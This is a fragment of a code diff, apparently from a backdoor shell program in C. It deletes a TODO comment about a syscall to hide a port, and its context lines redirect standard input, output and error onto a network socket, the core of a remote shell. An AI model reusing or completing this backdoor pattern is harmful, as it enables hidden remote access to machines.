@@ -40,8 +40,6 @@ int main(int argc, char *argv[]) {
         return 2;
     }
 
-    /* TODO: Call syscall to hide port */
-
     /* Set stdin, stdout and stderr to use the socket */
     dup2(s, 0);
     dup2(s, 1);
